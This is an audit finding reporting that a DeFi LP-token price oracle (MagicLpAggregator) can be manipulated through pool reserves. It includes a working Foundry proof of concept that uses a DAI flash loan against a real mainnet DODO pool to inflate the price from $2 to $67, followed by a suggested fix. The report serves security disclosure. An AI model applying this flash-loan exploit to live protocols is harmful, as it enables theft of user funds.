[H-04] Oracle price can be manipulated
Submitted bySpicyMeatball, also found byBreeje
Oracle price can be manipulated.
Proof of Concept
MagicLpAggregator uses pool reserves to calculate the price of the pair token,
function_getReserves()internalviewvirtualreturns(uint256,uint256) {(uint256baseReserve,uint256quoteReserve) =pair.getReserves();}functionlatestAnswer()publicviewoverridereturns(int256) {uint256baseAnswerNomalized=uint256(baseOracle.latestAnswer()) * (10** (WAD-baseOracle.decimals()));uint256quoteAnswerNormalized=uint256(quoteOracle.latestAnswer()) * (10** (WAD-quoteOracle.decimals()));uint256minAnswer=baseAnswerNomalized<quoteAnswerNormalized?baseAnswerNomalized:quoteAnswerNormalized;>>      (uint256baseReserve,uint256quoteReserve) =_getReserves();baseReserve=baseReserve* (10** (WAD-baseDecimals));quoteReserve=quoteReserve* (10** (WAD-quoteDecimals));returnint256(minAnswer* (baseReserve+quoteReserve) /pair.totalSupply());}
However, reserve values can be manipulated. For example, an attacker can use a flash loan to inflate the pair price, see coded POC below
// SPDX-License-Identifier: UNLICENSEDpragmasolidity^0.8.13;import"utils/BaseTest.sol";import"oracles/aggregators/MagicLpAggregator.sol";// import "forge-std/console2.sol";interfaceIDodo{functiongetVaultReserve()externalviewreturns(uint256baseReserve,uint256quoteReserve);function_QUOTE_TOKEN_()externalviewreturns(address);functionsellBase(addressto)externalreturns(uint256);functionsellQuote(addressto)externalreturns(uint256);}interfaceIFlashMinter{functionflashLoan(address,address,uint256,bytesmemory)external;}contractMagicLpAggregatorExtisMagicLpAggregator{constructor(IMagicLPpair_,IAggregatorbaseOracle_,IAggregatorquoteOracle_)MagicLpAggregator(pair_,baseOracle_,quoteOracle_) {}function_getReserves()internalviewoverridereturns(uint256,uint256) {returnIDodo(address(pair)).getVaultReserve();}}contractBorrower{IFlashMinterprivateimmutableminter;IDodoprivateimmutabledodoPool;MagicLpAggregatorprivateimmutableoracle;constructor(address_minter,address_dodoPool,address_oracle) {minter=IFlashMinter(_minter);dodoPool=IDodo(_dodoPool);oracle=MagicLpAggregator(_oracle);}/// Initiate a flash loanfunctionflashBorrow(addresstoken,uint256amount)public{IERC20Metadata(token).approve(address(minter), ~uint256(0));minter.flashLoan(address(this),token,amount,"");}/// ERC-3156 Flash loan callbackfunctiononFlashLoan(addressinitiator,addresstoken,// DAIuint256amount,uint256fee,bytescalldatadata)externalreturns(bytes32) {// tamper with the DAI/USDT poolIERC20Metadata(token).transfer(address(dodoPool),amount);dodoPool.sellBase(address(this));IERC20Metadataquote=IERC20Metadata(dodoPool._QUOTE_TOKEN_());uint256quoteAmount=quote.balanceOf(address(this));// pair price after tamperinguint256response=uint256(oracle.latestAnswer());console.log("BAD ANSWER: ",response);// Do something evil here// swap tokens back and repay the loanaddress(quote).call{value:0}(abi.encodeWithSignature("transfer(address,uint256)",address(dodoPool),quoteAmount));dodoPool.sellQuote(address(this));IERC20Metadata(token).transfer(initiator,amount+fee);returnkeccak256("ERC3156FlashBorrower.onFlashLoan");}}contractMagicLpAggregatorTestisBaseTest{MagicLpAggregatorExtaggregator;addresspublicDAI=0x6B175474E89094C44Da98b954EedeAC495271d0F;addressconstantDAI_MINTER=0x60744434d6339a6B27d73d9Eda62b6F66a0a04FA;addressconstantDODO_POOL=0x3058EF90929cb8180174D74C507176ccA6835D73;functionsetUp()publicoverride{fork(ChainId.Mainnet,19365773);_setUp();}function_setUp()public{super.setUp();aggregator=newMagicLpAggregatorExt(IMagicLP(DODO_POOL),IAggregator(0xAed0c38402a5d19df6E4c03F4E2DceD6e29c1ee9),IAggregator(0x3E7d1eAB13ad0104d2750B8863b489D65364e32D));}functiontestGetResult()public{uint256response=uint256(aggregator.latestAnswer());// pair price before ~ $2assertEq(response,2000502847471294054);console.log("GOOD ANSWER: ",response);// use DAI flash minter to inflate the pair price to $67Borrowerborrower=newBorrower(DAI_MINTER,DODO_POOL,address(aggregator));deal(DAI,address(borrower),1100*1e18);IERC20Metadata(DAI).approve(address(borrower),type(uint256).max);borrower.flashBorrow(DAI,100_000_000ether);}}
In this test, a user increased the price of DAI/USDT pair token from 2 USD to 67 USD using DAI Flash Minter.
Tools Used
Foundry, MagicLpAggregator.t.sol
Recommended Mitigation Steps
Consider adding a sanity check, where base and quote token prices are compared with the chainlink price feed
function latestAnswer() public view override returns (int256) {uint256 baseAnswerNomalized = uint256(baseOracle.latestAnswer()) * (10 ** (WAD - baseOracle.decimals()));uint256 quoteAnswerNormalized = uint256(quoteOracle.latestAnswer()) * (10 ** (WAD - quoteOracle.decimals()));uint256 minAnswer = baseAnswerNomalized < quoteAnswerNormalized ? baseAnswerNomalized : quoteAnswerNormalized;+       uint256 midPrice = pair.getMidPrice() * (10 ** (WAD - 6);+       uint256 feedPrice = baseAnswerNormalized * WAD / quoteAnswerNormalized;+       uint256 difference = midPrice > feedPrice+           ? (midPrice - feedPrice) * 10000 / midPrice+           : (feedPrice - midPrice) * 10000 / feedPrice;+       // if too big difference - revert+       if (difference >= MAX_DIFFERENCE) {+           revert PriceDifferenceExceeded();+       }(uint256 baseReserve, uint256 quoteReserve) = _getReserves();baseReserve = baseReserve * (10 ** (WAD - baseDecimals));quoteReserve = quoteReserve * (10 ** (WAD - quoteDecimals));return int256(minAnswer * (baseReserve + quoteReserve) / pair.totalSupply());}
0xmDreamy (Abracadabra) acknowledged